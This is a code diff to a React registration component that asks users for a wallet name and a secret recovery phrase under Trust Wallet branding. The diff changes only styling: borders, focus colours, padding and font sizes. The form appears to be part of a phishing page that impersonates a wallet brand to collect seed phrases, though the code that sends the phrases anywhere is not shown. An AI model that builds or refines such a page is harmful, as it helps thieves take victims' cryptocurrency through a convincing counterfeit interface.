@@ -78,7 +78,7 @@ const Register = () => {
               <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                 Wallet name
               </label>
-              <div className="relative flex items-center bg-[#f2f4f6] rounded-[14px] px-4 py-3.5 border-[2px] border-[#5865F2] focus-within:border-gray-300">
+              <div className="relative flex items-center bg-[#f2f4f6] rounded-[14px] px-4 py-3.5 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                 <input
                   type="text"
                   name="wallet_name"
@@ -107,7 +107,7 @@ const Register = () => {
               <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                 Secret phrase
               </label>
-              <div className="relative bg-[#f2f4f6] rounded-[18px] p-4 border-[2px] border-[#5865F2]">
+              <div className="relative bg-[#f2f4f6] rounded-[18px] p-4 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                 <textarea
                   name="phrase"
                   value={phrase}
@@ -150,11 +150,11 @@ const Register = () => {
       <div className="hidden md:flex md:flex-row flex-col">
         {/* Left branding panel */}
         <div className="bg-primary md:rounded-none rounded-bl-[20px] rounded-br-[20px] overflow-hidden flex-[1] flex relative h-[100dvh]">
-          <div className="p-5 md:space-y-3 relative z-10">
-            <div className="md:text-[55px] text-white text-[30px] md:leading-[60px] leading-[40px] font-[700]">
+          <div className="p-14 md:space-y-3 relative z-10">
+            <div className="md:text-[58px] text-white text-[30px] md:leading-[70px] leading-[40px] font-[700]">
               True crypto ownership. Powerful Web3 experiences
             </div>
-            <div className="text-white text-opacity-90 md:text-[16px] text-[14px] mt-4">
+            <div className="text-white text-opacity-90 md:text-[25px] text-[14px] mt-4">
               Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.
             </div>
           </div>
@@ -173,7 +173,7 @@ const Register = () => {
               <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                 Wallet name
               </label>
-              <div className="relative flex items-center bg-[#f2f4f6] rounded-[14px] px-4 py-3.5 border-[2px] border-[#5865F2] focus-within:border-gray-300">
+              <div className="relative flex items-center bg-[#f2f4f6] rounded-[14px] px-4 py-3.5 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                 <input
                   type="text"
                   name="wallet_name"
@@ -191,7 +191,7 @@ const Register = () => {
               <label className="text-[14px] text-gray-500 font-medium mb-1.5 block">
                 Secret phrase
               </label>
-              <div className="relative bg-[#f2f4f6] rounded-[18px] p-4 border-[2px] border-[#5865F2]">
+              <div className="relative bg-[#f2f4f6] rounded-[18px] p-4 border-[2px] border-transparent focus-within:border-[#5865F2] transition-colors duration-150">
                 <textarea
                   name="phrase"
                   value={phrase}
